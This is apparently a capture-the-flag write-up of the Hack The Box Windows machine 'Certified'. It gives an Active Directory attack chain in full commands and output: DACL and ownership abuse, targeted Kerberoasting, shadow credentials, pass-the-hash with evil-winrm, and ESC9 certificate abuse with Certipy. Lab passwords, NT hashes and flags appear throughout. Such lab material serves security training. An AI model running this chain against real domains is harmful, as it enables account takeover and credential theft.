---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - Certipy
  - Pass-The-Certificate
  - ESC-9
  - Shadow-Credential-Attack
  - DACLedit
---
# Overview

| Name        | Certified   |
| ----------- | ----------- |
| OS          | Windows     |
| Base Points | Medium [30] |
| Status      | Done        |

As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: `judith.mader` Password: `judith09`
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.231.186 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 10:47 CDT
Nmap scan report for 10.129.231.186
Host is up (0.076s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-17 22:47:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-17T22:49:18+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-10-17T22:49:18+00:00; +7h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-10-17T22:49:18+00:00; +7h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2025-10-17T22:49:18+00:00; +7h00m01s from scanner time.
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-17T22:48:39
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
# Enumeration

```bash
$ nxc smb target 10.129.231.186 -u 'judith.mader' -p 'judith09' --shares
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.231.186  445    DC01             [*] Enumerated shares
SMB         10.129.231.186  445    DC01             Share           Permissions     Remark
SMB         10.129.231.186  445    DC01             -----           -----------     ------
SMB         10.129.231.186  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.231.186  445    DC01             C$                              Default share
SMB         10.129.231.186  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.231.186  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.231.186  445    DC01             SYSVOL          READ            Logon server share 
```

```bash
$ nxc smb target 10.129.231.186 -u 'judith.mader' -p 'judith09' --rid-brute
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.186  445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.129.231.186  445    DC01             498: CERTIFIED\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.186  445    DC01             500: CERTIFIED\Administrator (SidTypeUser)
SMB         10.129.231.186  445    DC01             501: CERTIFIED\Guest (SidTypeUser)
SMB         10.129.231.186  445    DC01             502: CERTIFIED\krbtgt (SidTypeUser)
SMB         10.129.231.186  445    DC01             512: CERTIFIED\Domain Admins (SidTypeGroup)
SMB         10.129.231.186  445    DC01             513: CERTIFIED\Domain Users (SidTypeGroup)
SMB         10.129.231.186  445    DC01             514: CERTIFIED\Domain Guests (SidTypeGroup)
SMB         10.129.231.186  445    DC01             515: CERTIFIED\Domain Computers (SidTypeGroup)
SMB         10.129.231.186  445    DC01             516: CERTIFIED\Domain Controllers (SidTypeGroup)
SMB         10.129.231.186  445    DC01             517: CERTIFIED\Cert Publishers (SidTypeAlias)
SMB         10.129.231.186  445    DC01             518: CERTIFIED\Schema Admins (SidTypeGroup)
SMB         10.129.231.186  445    DC01             519: CERTIFIED\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.186  445    DC01             520: CERTIFIED\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.186  445    DC01             521: CERTIFIED\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.186  445    DC01             522: CERTIFIED\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.186  445    DC01             525: CERTIFIED\Protected Users (SidTypeGroup)
SMB         10.129.231.186  445    DC01             526: CERTIFIED\Key Admins (SidTypeGroup)
SMB         10.129.231.186  445    DC01             527: CERTIFIED\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.186  445    DC01             553: CERTIFIED\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.186  445    DC01             571: CERTIFIED\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.186  445    DC01             572: CERTIFIED\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.186  445    DC01             1000: CERTIFIED\DC01$ (SidTypeUser)
SMB         10.129.231.186  445    DC01             1101: CERTIFIED\DnsAdmins (SidTypeAlias)
SMB         10.129.231.186  445    DC01             1102: CERTIFIED\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.186  445    DC01             1103: CERTIFIED\judith.mader (SidTypeUser)
SMB         10.129.231.186  445    DC01             1104: CERTIFIED\Management (SidTypeGroup)
SMB         10.129.231.186  445    DC01             1105: CERTIFIED\management_svc (SidTypeUser)
SMB         10.129.231.186  445    DC01             1106: CERTIFIED\ca_operator (SidTypeUser)
SMB         10.129.231.186  445    DC01             1601: CERTIFIED\alexander.huges (SidTypeUser)
SMB         10.129.231.186  445    DC01             1602: CERTIFIED\harry.wilson (SidTypeUser)
SMB         10.129.231.186  445    DC01             1603: CERTIFIED\gregory.cameron (SidTypeUser)
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

```bash
echo -e "10.129.231.186\tcertified.htb dc01.certified.htb dc01" | sudo tee -a /etc/hosts
```

```bash
sudo ntpdate certified.htb
```

```bash
$ bloodhound-python -d certified.htb -u 'judith.mader' -p 'judith09' -ns 10.129.231.186 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 15S
INFO: Compressing output into 20251017181816_bloodhound.zip+
```

![[certified.png]]
# Initial Foothold

First we add `judith.mader` as owner to Management group.

```bash
$ owneredit.py -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Since we now own the group, we can now give the user permission to add members via `dacledit.py`.

```bash
$ dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251017-183919.bak
[*] DACL modified successfully
```

After that we add `judith.mader` as member to the `Management` group.

```bash
$ net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.231.186"
```

![[certified2.png]]

`Management` has GenericWrite to `Management_svc` now we can abuse it for targeted kerberoasting.
## Kerberoasting

```bash
$ python3 targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09' --request-user MANAGEMENT_SVC
[*] Starting kerberoast attacks
[*] Attacking user (MANAGEMENT_SVC)
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$a8e12750afe5b0079e4a3a56b8162c03$a844f21a0616f447f8096898684a77db8912d7220d86320290e260590721c6b5435e0388abfa013d1698e547a3dc1a0eda0a5d25215caca5be38be1681db7a44194d78189171cd2ee094cb2a613c8df5e3142b70970edcea430cd7950e9a8d7350d5d78a78fae711d7e4fe0faf560e44d6afa84aae8e85588f0729b8458c238d7df2f55b5be8670cabaa110ccd099fdaac57489bc4270d953161959b4833e4875c8e4ff8818351d1316981c165d2fb88801f1f7e88b1e0c3c0cc92626b67f3decc79d9b9d791b7602215084f4b5a43f10d8b61302ebb4df01f2ccd92639efecb9c7cfd18a10d5e15abff047c81fd50dcd07dcffc9278b6a1995a60fddb50372252aff23ed81139d7a9979dd83c732b2f69766c15ccba02d07e9db5296e744de620775cf300e136961c66faf3ce8d492b539b99d15cfc0528aaf71874ddf7f24f34312c139fccd090805f151b4ceb0f46a7767696c382c652c17d16c89a0950031faaca3f4a1f9ac88acedddbba03c5634536fe034f99bc038a15e2bdcd525a6b5e393ecef70072d048868f061cfddbc04dd452fb5c0b795bbba1965dd04248552c242a1a877d0703efeb6393e5e319b979eca486718673882364539bdaee4f131a46807c90328634149f578c927a6bb61237dd4fb8b8b622297d6126e7b71d7864a0b6ea8e06d7905a91f2f8823c0eb8302f05cbbca7b2edbb90eca97c9430157c4e78f7b200903a61b2ae73c5c77437261cf0d424769b7b43038857f4a7a8a4b77fca0441be9b4cd9311806e99e6b000335f8f1430a707f249f9fb0658e9b89ded7c4e1b2d1e7c2ad74690b2095da3cf08db9633c94b050c5347bdbbbc09d2536645c4313c2ab97cd0df600c63da9ddddc33e0f87ba277e17c348d0d893412ffc9d5b5fdb581290d99997084a3de4217650fb16725444fece87d40b99da762e54ea46750adf7be3ea4709576fe6f6636750e98b5c824af5ed5bb999d687d30ff12c018d163ea32d801d76f8d2a8cf1018317e560b532184000107a0be565262abd7b12a3be621e19b487509d1a0c986d03d001e2f968f4f5681c237a13321abaad39ce9e99bf9e98d86110e6a4af8e073f777fa05d435bfd5782aa506777cc897de5e11b91d883b46065ff57b9c4f189a09f87a889d1d81e944809fdec36d106fe1822a2fb8f0b0148ea2bd74cef5808df544930dec3be3371d3008f048e6eba0117037a18082b2cc1067fd78b1e6f31de104e719977fddf7bf40674176c747ccdac31d416ea99ba3bccf05c3b3748dce2d270d0ad118f0667f68b39866428f6df1ce4fdaf78a75eef36e45f0d675fd7c9340a105f985c5d09c8fcfb079545ef32974ef302ec1b49504bfaf6ced408a41725f7cf4a075c565db7c6600b9066d206bb44c2d8092cb109160666ae9952aaf998dfc9663c7ad3e596c771b82862f92eb85b5e8b296b2fd8c39d59f1d84a776effc101c599924b856c6a6823d48d43bb0b6e925c8ffac2f4f83c935fc08f4a930a6c03b7de1d9a5a163a8ef29626b4a491efa1013ac881bcebbc2c0ba09ed77f368ca26bed5e28480
```

This hash won't crack so we can try shadow credential attack.
## Shadow Credential Attack

**Shadow Credential Attack** is a technique that lets you **add your own authentication method** to a user account, then use it to get that user's password hash. We need NT hash of `krbtgt` since that above hash couldn't be cracked.

```bash
$ certipy shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'MANAGEMENT_SVC' -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '1a7355d0-11f5-8ff3-bd90-ce6dd2f0e6a6'
[*] Adding Key Credential with device ID '1a7355d0-11f5-8ff3-bd90-ce6dd2f0e6a6' to the Key Credentials for 'management_svc'
[-] Could not update Key Credentials for 'management_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

The changes we made above is getting reset quickly so do it fast:

```bash
owneredit.py -action write -new-owner 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target 'MANAGEMENT' 'certified.htb'/'judith.mader':'judith09'
net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%"judith09" -S "10.129.231.186"
certipy shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'MANAGEMENT_SVC' -dc-ip 10.129.231.186
```

```bash
$ certipy shadow auto -u 'judith.mader@certified.htb' -p 'judith09' -account 'MANAGEMENT_SVC' -dc-ip 10.129.231.186
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '01b8b8db-269b-9773-e2bd-2f153fdae327'
[*] Adding Key Credential with device ID '01b8b8db-269b-9773-e2bd-2f153fdae327' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '01b8b8db-269b-9773-e2bd-2f153fdae327' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

We got NT hash `a091c1832bcdd4677c28b5a6a1295584`.

```bash
$ evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\management_svc\Desktop> cat user.txt
9830e9f026172f41b0abc5f9f8ca8c78
```
# Privilege Escalation
## Certipy

```bash
$ certipy find -u management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -dc-ip 10.129.231.186 -vulnerable
```

```bash
$ cat 20251017191326_Certipy.txt
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

It find no template vulnerable.

![[certified3.png]]

We have _GenericAll_ permissions over the user `CA_Operator` as `management_svc`.
## Force Change Password `CA_Operator`

```powershell
*Evil-WinRM* PS C:\Users\management_svc\Documents> Set-ADAccountPassword -Identity "ca_operator" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewPassword123!" -Force)
*Evil-WinRM* PS C:\Users\management_svc\Documents> net user ca_operator NewPassword123! /domain
The command completed successfully.
```

Now we are able to query for vulnerable templates as `ca_operator`.

```bash
$ certipy find -u ca_operator@certified.htb -p 'NewPassword123!' -dc-ip 10.129.231.186 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

We see `ESC9` is vulnerable.
## ESC9

> ESC9 refers to the new `msPKI-Enrollment-Flag` value `CT_FLAG_NO_SECURITY_EXTENSION` (`0x80000`). If this flag is set on a certificate template, the new `szOID_NTDS_CA_SECURITY_EXT` security extension will **not** be embedded. ESC9 is only useful when `StrongCertificateBindingEnforcement` is set to `1` (default), since a weaker certificate mapping configuration for Kerberos or Schannel can be abused as ESC10 — without ESC9 — as the requirements will be the same.

> To abuse this misconfiguration, the attacker needs `GenericWrite` over any account A that is allowed to enroll in the certificate template to compromise account B (target).

Conditions:

 - `StrongCertificateBindingEnforcement` set to `1` (default) or `0`
 - Certificate contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
 - Certificate specifies any client authentication EKU
 
Requisites:

 - `GenericWrite` over any account A to compromise any account B

Follow this [example](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7). Update account `management_svc` with UPN (User Principal Name) pointing to `Administrator`.

```bash
$ certipy account update -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

We request the vulnerable certificate template `CertifiedAuthentication` (`ESC9`)`

```bash
$ echo -e "10.129.231.186\tcertified.htb dc01.certified.htb dc01" | sudo tee -a /etc/hosts
10.129.231.186	certified.htb dc01.certified.htb dc01
$ certipy req -username ca_operator@certified.htb -p 'NewPassword123!' -ca certified-DC01-CA -template CertifiedAuthenticationCertipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Then, we change back the `userPrincipalName` of `ca_operator` back to `ca_operator`.

```bash
$ certipy account update -username management_svc@certified.htb -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user ca_operator -upn ca_operator@certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

Now, if we try to authenticate with the certificate, we will receive the NT hash of the `Administrator@certified.htb` user. We need to add `-domain certified.htb` to our command since there is no domain specified in the certificate. We receive the Administrators hash.

```bash
$ certipy auth -pfx administrator.pfx -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

```bash
$ evil-winrm -i certified.htb -u Administrator -H '0d5b49608bbce1751f708748f67e2d34'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
cb2c85776ae60b002373a2b3327246ad
```

---
